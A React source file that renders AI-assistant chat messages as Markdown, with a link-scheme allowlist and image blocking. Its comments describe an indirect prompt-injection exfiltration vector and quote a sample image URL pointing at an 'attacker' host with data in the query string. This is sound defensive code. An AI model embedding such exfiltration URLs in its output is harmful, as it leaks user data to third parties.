'use client';

import { memo } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';

// OWASP LLM05 (Improper Output Handling) / LLM01 (indirect prompt injection):
// assistant content is LLM-generated and may be influenced by retrieved or
// injected text. Only allow safe link schemes and never auto-load images —
// markdown images pointing at an attacker-controlled URL are a known
// data-exfiltration vector (the browser fetches the URL, including anything
// encoded in the query string, with no user interaction).
const SAFE_HREF_SCHEME = /^(https?:|mailto:|\/|#)/i;

function sanitizeHref(href?: string): string | undefined {
  if (!href) return undefined;
  const trimmed = href.trim();
  return SAFE_HREF_SCHEME.test(trimmed) ? trimmed : undefined;
}

/**
 * Renders assistant chat content as Markdown, styled for a compact chat bubble.
 *
 * Custom component mapping keeps headings small and spacing tight so rich
 * formatting (headings, bold, lists, links, code) reads naturally inside the
 * narrow assistant bubble instead of looking like a full document. Plain text
 * passes through unchanged, so this is a safe drop-in for existing responses.
 */
const markdownComponents: Components = {
  h1: ({ children }) => (
    <h3 className="mb-1 mt-2 text-sm font-semibold text-gray-900 first:mt-0">{children}</h3>
  ),
  h2: ({ children }) => (
    <h3 className="mb-1 mt-2 text-sm font-semibold text-gray-900 first:mt-0">{children}</h3>
  ),
  h3: ({ children }) => (
    <h4 className="mb-1 mt-2 text-sm font-semibold text-gray-900 first:mt-0">{children}</h4>
  ),
  h4: ({ children }) => (
    <h4 className="mb-1 mt-2 text-[13px] font-semibold text-gray-900 first:mt-0">{children}</h4>
  ),
  p: ({ children }) => <p className="mb-2 last:mb-0">{children}</p>,
  ul: ({ children }) => (
    <ul className="mb-2 ml-4 list-disc space-y-0.5 last:mb-0 marker:text-gray-400">{children}</ul>
  ),
  ol: ({ children }) => (
    <ol className="mb-2 ml-4 list-decimal space-y-0.5 last:mb-0 marker:text-gray-400">{children}</ol>
  ),
  li: ({ children }) => <li className="leading-snug">{children}</li>,
  strong: ({ children }) => <strong className="font-semibold text-gray-900">{children}</strong>,
  em: ({ children }) => <em className="italic">{children}</em>,
  a: ({ children, href }) => {
    const safeHref = sanitizeHref(href);
    // Unsafe scheme (javascript:, data:, etc.) — render as plain text, not a link.
    if (!safeHref) return <>{children}</>;
    return (
      <a
        href={safeHref}
        target="_blank"
        rel="noopener noreferrer"
        className="font-medium text-accent-600 underline underline-offset-2 hover:text-accent-500"
      >
        {children}
      </a>
    );
  },
  // Never auto-load images from assistant content: LLM output can be
  // influenced by injected/retrieved text, and an <img src="https://attacker/..."
  // ?data=..."> is fetched by the browser with zero clicks, exfiltrating
  // anything the model encoded in the URL. Render the alt text instead.
  img: ({ alt }) => (alt ? <span className="italic text-gray-500">[image: {alt}]</span> : null),
  code: ({ children }) => (
    <code className="rounded bg-gray-100 px-1 py-0.5 font-mono text-[12px] text-gray-800">
      {children}
    </code>
  ),
  pre: ({ children }) => (
    <pre className="mb-2 overflow-x-auto rounded-lg bg-gray-100 p-2 font-mono text-[12px] text-gray-800 last:mb-0">
      {children}
    </pre>
  ),
  blockquote: ({ children }) => (
    <blockquote className="mb-2 border-l-2 border-gray-300 pl-2.5 italic text-gray-600 last:mb-0">
      {children}
    </blockquote>
  ),
  hr: () => <hr className="my-2 border-gray-200" />,
};

interface MarkdownMessageProps {
  content: string;
}

function MarkdownMessageBase({ content }: MarkdownMessageProps) {
  return (
    <div className="break-words text-sm leading-relaxed text-gray-800">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={markdownComponents}>
        {content}
      </ReactMarkdown>
    </div>
  );
}

export const MarkdownMessage = memo(MarkdownMessageBase);
